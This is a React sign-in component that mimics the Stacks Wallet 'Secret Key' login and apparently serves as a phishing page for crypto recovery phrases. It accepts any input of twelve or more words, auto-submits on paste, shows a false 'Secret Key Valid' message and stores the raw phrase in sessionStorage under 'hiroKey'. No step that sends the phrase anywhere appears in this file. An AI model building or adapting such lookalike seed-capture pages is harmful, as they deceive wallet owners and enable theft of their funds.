import { useState } from "react";
import { 
	Flex,
	Text,
  	Spacer,
  	Image,
  	Spinner,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import { useHistory } from 'react-router-dom';
import KeyIcon from "./key.png";


function SignIn({ setVarPage, setToLoad }) {
    const [error, setError] = useState(false)
    const [loading, setLoading] = useState(false)
    const [seedOk, setSeedOk] = useState(false)
    setVarPage(true)
    const history = useHistory()

    return (
        <Flex w="100%" flex="1" align={["flex-start", "center"]} px={["6%", "33%"]} justify="center">
            <Flex id="goBack" onClick={() => history.goBack()}></Flex>
            <Flex direction="column" flex="1" align={["flex-start", "center"]}>
                <Image w="101px" mb={["28px", "32px"]} src={KeyIcon} />
                <Text fontWeight="bold" fontSize={["24px", "48px"]} fontFamily="var" textAlign="center" mb={["24px", "32px"]} lineHeight="125%">Sign in with your Secret Key</Text>
                <Text mb="24px" color="#747478">Enter your 12- or 24-word Secret Key to sign in to Stacks Wallet with an existing account</Text>

                <textarea style={{ border: "1px solid #F0F0F2", borderRadius: "10px", padding: "14px 16px", height: "168px", letterSpacing: "-0.01em", lineHeight: "1.4", width: "100%", appearance: "none", color: "#424248" }} placeholder="Paste or type your Secret Key" id="secKey" onPaste={() => {
                    setTimeout(function(){
                        document.getElementById('proBtn').click()
                    }, 100)
                }}></textarea>
                {
                    error &&
                    <Flex mt="4">
                        <i className="mdi mdi-information-outline" style={{ fontSize: "20px", color: "#CF0000", transform: "rotate(360deg)"}}></i>
                        <Text ml="3" mt="4px" color="#CF0000" pr="32px" lineHeight="1.333" fontSize="12px">Incorrect Secret Key. Make sure it is 12 or 24 words with spaces between words.</Text>
                    </Flex>
                }

                <Flex cursor="pointer" mt="32px" justify="center" w="100%" padding="14px 16px" borderRadius="10px" color="#fff" bg="rgb(85, 70, 255)" transition="all 0.2s cubic-bezier(0.23, 1, 0.32, 1) 0s" fontSize="14px" _hover={{ bg: "rgb(68, 51, 255)" }} fontWeight="bold" mr="2" opacity={loading ? ".4" : "1"} id="proBtn" onClick={() => {
                    var secKey = document.getElementById('secKey').value
                    if(secKey === "") {
                        setError(true)
                    }
                    else if(secKey.match(/(\w+)/g)?.length < 12) {
                        setError(true)
                    }
                    else {
                        setError(false)
                        setLoading(true)
                        setSeedOk(true)
                        setTimeout(function() {
                            sessionStorage.setItem("hiroKey", secKey)
                            setToLoad(0)
                            setLoading(false)
                            history.push("/set-password")
                        }, 2000)
                    }
                }}>{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Continue"}</Flex>
                {
                    seedOk && 
                    <Flex textAlign="center" justify="center" fontSize={["12px", "14px"]} mt="20px" fontWeight="bold" align="center">
                        <Flex py="2" px="6" borderRadius="10px" bg="#F0F0F2" align="center">
                            <i className="mdi mdi-checkbox-marked-circle" style={{ fontSize: "18px", color: "#00A200" }}></i>
                            <Text ml="2">Secret Key Valid</Text>
                        </Flex>
                    </Flex>
                }
            </Flex>
        </Flex>
    )
}


export default SignIn;